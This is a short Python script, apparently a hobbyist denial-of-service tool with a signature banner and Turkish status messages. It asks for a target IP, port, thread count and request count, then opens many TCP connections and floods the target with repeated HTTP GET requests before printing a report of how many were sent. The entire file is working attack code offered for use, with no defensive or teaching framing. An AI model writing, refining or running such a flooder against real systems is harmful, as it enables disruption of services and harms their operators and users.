import socket
import threading
import time

def animate_text(text):
    animation = "|/-\\"
    for i in range(10):
        time.sleep(0.1)
        print("\r" + animation[i % len(animation)], end="")
    print("\r" + text)

def create_socket(target_ip, target_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    return s

def send_attack(s, target_ip, num_requests):
    payload = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
    for _ in range(num_requests):
        try:
            s.sendall(payload.encode())
            animate_text("Saldırı yapılıyor!")
        except socket.error:
            break

def start_attack(target_ip, target_port, num_threads, num_requests):
    sockets = []
    for _ in range(num_threads):
        s = create_socket(target_ip, target_port)
        sockets.append(s)

    threads = []
    for s in sockets:
        t = threading.Thread(target=send_attack, args=(s, target_ip, num_requests))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    animate_text("Saldırı tamamlandı!")
    print("Rapor: Hedef " + target_ip + " üzerinde " + str(num_threads) + " thread kullanarak toplam " + str(num_requests*num_threads) + " istek gönderildi.")

def main():
    print("""
.-------------------------------.
| (•̪●)=︻╦̵̵̿╤── byMca-tmk -  ⁍ |
'-------------------------------'
""")


    target_ip = input("Enter the destination IP address: ")
    target_port = int(input("Enter the destination port number: "))
    num_threads = int(input("Enter the number of threads to use: "))
    num_requests = int(input("Enter the number of requests for each thread: "))

    start_attack(target_ip, target_port, num_threads, num_requests)

if __name__ == "__main__":
    main()
